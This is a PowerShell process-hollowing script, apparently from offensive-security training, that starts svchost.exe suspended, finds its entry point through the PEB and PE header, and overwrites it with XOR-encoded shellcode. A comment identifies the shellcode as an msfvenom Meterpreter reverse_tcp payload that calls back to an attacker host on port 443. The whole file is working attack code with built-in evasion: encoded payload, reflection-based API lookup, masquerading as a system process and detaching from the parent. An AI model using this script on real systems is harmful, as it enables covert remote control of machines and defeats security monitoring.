# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f csharp EXITFUNC=thread
# Shellcode should be XOR'd with key: 0xfa
[Byte[]] $SHELLCODE = 0x6,0xb2,0x79,0x1e,0xa,0x12,0x36,0xfa,0xfa,0xfa,0xbb,0xab,0xbb,0xaa,0xa8,0xab,0xb2,0xcb,0x28,0xac,0x9f,0xb2,0x71,0xa8,0x9a,0xb2,0x71,0xa8,0xe2,0xb2,0x71,0xa8,0xda,0xb2,0x71,0x88,0xaa,0xb2,0xf5,0x4d,0xb0,0xb0,0xb7,0xcb,0x33,0xb2,0xcb,0x3a,0x56,0xc6,0x9b,0x86,0xf8,0xd6,0xda,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0x18,0x17,0xa8,0xbb,0xab,0xb2,0x71,0xa8,0xda,0x71,0xb8,0xc6,0xb2,0xfb,0x2a,0x9c,0x7b,0x82,0xe2,0xf1,0xf8,0xf5,0x7f,0x88,0xfa,0xfa,0xfa,0x71,0x7a,0x72,0xfa,0xfa,0xfa,0xb2,0x7f,0x3a,0x8e,0x9d,0xb2,0xfb,0x2a,0xbe,0x71,0xba,0xda,0xaa,0x71,0xb2,0xe2,0xb3,0xfb,0x2a,0x19,0xac,0xb7,0xcb,0x33,0xb2,0x5,0x33,0xbb,0x71,0xce,0x72,0xb2,0xfb,0x2c,0xb2,0xcb,0x3a,0xbb,0x3b,0x33,0xf7,0x56,0xbb,0xfb,0x3b,0xc2,0x1a,0x8f,0xb,0xb6,0xf9,0xb6,0xde,0xf2,0xbf,0xc3,0x2b,0x8f,0x22,0xa2,0xbe,0x71,0xba,0xde,0xb3,0xfb,0x2a,0x9c,0xbb,0x71,0xf6,0xb2,0xbe,0x71,0xba,0xe6,0xb3,0xfb,0x2a,0xbb,0x71,0xfe,0x72,0xb2,0xfb,0x2a,0xbb,0xa2,0xbb,0xa2,0xa4,0xa3,0xa0,0xbb,0xa2,0xbb,0xa3,0xbb,0xa0,0xb2,0x79,0x16,0xda,0xbb,0xa8,0x5,0x1a,0xa2,0xbb,0xa3,0xa0,0xb2,0x71,0xe8,0x13,0xb1,0x5,0x5,0x5,0xa7,0xb3,0x44,0x8d,0x89,0xc8,0xa5,0xc9,0xc8,0xfa,0xfa,0xbb,0xac,0xb3,0x73,0x1c,0xb2,0x7b,0x16,0x5a,0xfb,0xfa,0xfa,0xb3,0x73,0x1f,0xb3,0x46,0xf8,0xfa,0xfb,0x41,0x3a,0x52,0xcb,0xc0,0xbb,0xae,0xb3,0x73,0x1e,0xb6,0x73,0xb,0xbb,0x40,0xb6,0x8d,0xdc,0xfd,0x5,0x2f,0xb6,0x73,0x10,0x92,0xfb,0xfb,0xfa,0xfa,0xa3,0xbb,0x40,0xd3,0x7a,0x91,0xfa,0x5,0x2f,0x90,0xf0,0xbb,0xa4,0xaa,0xaa,0xb7,0xcb,0x33,0xb7,0xcb,0x3a,0xb2,0x5,0x3a,0xb2,0x73,0x38,0xb2,0x5,0x3a,0xb2,0x73,0x3b,0xbb,0x40,0x10,0xf5,0x25,0x1a,0x5,0x2f,0xb2,0x73,0x3d,0x90,0xea,0xbb,0xa2,0xb6,0x73,0x18,0xb2,0x73,0x3,0xbb,0x40,0x63,0x5f,0x8e,0x9b,0x5,0x2f,0x7f,0x3a,0x8e,0xf0,0xb3,0x5,0x34,0x8f,0x1f,0x12,0x69,0xfa,0xfa,0xfa,0xb2,0x79,0x16,0xea,0xb2,0x73,0x18,0xb7,0xcb,0x33,0x90,0xfe,0xbb,0xa2,0xb2,0x73,0x3,0xbb,0x40,0xf8,0x23,0x32,0xa5,0x5,0x2f,0x79,0x2,0xfa,0x84,0xaf,0xb2,0x79,0x3e,0xda,0xa4,0x73,0xc,0x90,0xba,0xbb,0xa3,0x92,0xfa,0xea,0xfa,0xfa,0xbb,0xa2,0xb2,0x73,0x8,0xb2,0xcb,0x33,0xbb,0x40,0xa2,0x5e,0xa9,0x1f,0x5,0x2f,0xb2,0x73,0x39,0xb3,0x73,0x3d,0xb7,0xcb,0x33,0xb3,0x73,0xa,0xb2,0x73,0x20,0xb2,0x73,0x3,0xbb,0x40,0xf8,0x23,0x32,0xa5,0x5,0x2f,0x79,0x2,0xfa,0x87,0xd2,0xa2,0xbb,0xad,0xa3,0x92,0xfa,0xba,0xfa,0xfa,0xbb,0xa2,0x90,0xfa,0xa0,0xbb,0x40,0xf1,0xd5,0xf5,0xca,0x5,0x2f,0xad,0xa3,0xbb,0x40,0x8f,0x94,0xb7,0x9b,0x5,0x2f,0xb3,0x5,0x34,0x13,0xc6,0x5,0x5,0x5,0xb2,0xfb,0x39,0xb2,0xd3,0x3c,0xb2,0x7f,0xc,0x8f,0x4e,0xbb,0x5,0x1d,0xa2,0x90,0xfa,0xa3,0x41,0x1a,0xe7,0xd0,0xf0,0xbb,0x73,0x20,0x5,0x2f

$key = 0xfa

# Decoding routine
for ($i = 0; $i -lt $SHELLCODE.Length; $i++) {
    $SHELLCODE[$i] = $SHELLCODE[$i] -bxor $key
}

filter Get-Type ([string]$dllName,[string]$typeName)
{
    if( $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($dllName) )
    {
        $_.GetType($typeName)
    }
}

function Get-Function
{
    Param(
        [string] $module,
        [string] $function
    )

    if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) )
    {
        throw "Error: GetModuleHandle and GetProcAddress must be initialized first!"
    }

    $moduleHandle = $GetModuleHandle.Invoke($null, @($module))
    $GetProcAddress.Invoke($null, @($moduleHandle, $function))
}

function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
        [Parameter(Position = 2)] [Type] $retType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}

# Obtain the required types via reflection
$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$unsafeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.UnsafeNativeMethods'
$nativeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods'
$startupInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods+STARTUPINFO'
$processInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION'

# Obtain the required functions via reflection: GetModuleHandle, GetProcAddress and CreateProcess
$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')
$GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);
$CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")

# Obtain the function addresses of the required hollowing functions
$ResumeThreadAddr = Get-Function "kernel32.dll" "ResumeThread"
$ReadProcessMemoryAddr = Get-Function "kernel32.dll" "ReadProcessMemory"
$WriteProcessMemoryAddr = Get-Function "kernel32.dll" "WriteProcessMemory"
$ZwQueryInformationProcessAddr = Get-Function "ntdll.dll" "ZwQueryInformationProcess"

# Create the delegate types to call the previously obtain function addresses
$ResumeThread = Get-Delegate $ResumeThreadAddr @([IntPtr])
$WriteProcessMemory = Get-Delegate $WriteProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr])
$ReadProcessMemory = Get-Delegate $ReadProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool])
$ZwQueryInformationProcess = Get-Delegate $ZwQueryInformationProcessAddr @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([Int])

# Instantiate the required structures for CreateProcess and use them to launch svchost.exe
$startupInformation = $startupInformationType.GetConstructors().Invoke($null)
$processInformation = $processInformationType.GetConstructors().Invoke($null)

$cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\svchost.exe")
$CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation))

# Obtain the required handles from the PROCESS_INFORMATION structure
$hThread = $processInformation.hThread
$hProcess = $processInformation.hProcess

# Create a buffer to hold the PROCESS_BASIC_INFORMATION structure and call ZwQueryInformationProcess
$processBasicInformation = [System.Byte[]]::CreateInstance([System.Byte], 48)
$ZwQueryInformationProcess.Invoke($hProcess, 0, $processBasicInformation, $processBasicInformation.Length, 0)

# Locate the image base address. The address of the PEB is the second element within the PROCESS_BASIC_INFORMATION
# structure (e.g. offset 0x08 within the $processBasicInformation buffer on x64). Within the PEB, the base image
# addr is located at offset 0x10.
$imageBaseAddrPEB = ([IntPtr]::new([BitConverter]::ToUInt64($processBasicInformation, 0x08) + 0x10))

# Use ReadProcessMemory to read the required part of the PEB. We allocate already a buffer for 0x200
# bytes that we will use later on. From the PEB we actually only need 0x08 bytes, as $imageBaseAddrPEB
# already points to the correct memory location. We parse the obtained 0x08 bytes as Int64 and IntPtr.
$memoryBuffer = [System.Byte[]]::CreateInstance([System.Byte], 0x200)
$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPEB, $memoryBuffer, 0x08, 0)

$imageBaseAddr = [BitConverter]::ToInt64($memoryBuffer, 0)
$imageBaseAddrPointer = [IntPtr]::new($imageBaseAddr)

# Now that we have the base address, we can read the first 0x200 bytes to obtain the PE file format header.
# The offset of the PE header is at 0x3c within the PE file format header. Within the PE header, the relative
# entry point address can be found at an offset of 0x28. We combine this with the $imageBaseAddr and have finally
# found the non relative entry point address.
$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPointer, $memoryBuffer, $memoryBuffer.Length, 0)

$peOffset = [BitConverter]::ToUInt32($memoryBuffer, 0x3c)                               # PE header offset
$entryPointAddrRelative = [BitConverter]::ToUInt32($memoryBuffer, $peOffset + 0x28)     # Relative entrypoint
$entryPointAddr = [IntPtr]::new($imageBaseAddr + $entryPointAddrRelative)               # Absolute entrypoint

# Overwrite the entrypoint with shellcode and resume the thread.
$WriteProcessMemory.Invoke($hProcess, $entryPointAddr, $SHELLCODE, $SHELLCODE.Length, [IntPtr]::Zero)
$ResumeThread.Invoke($hThread)

# Close powershell to remove it as the parent of svchost.exe
exit
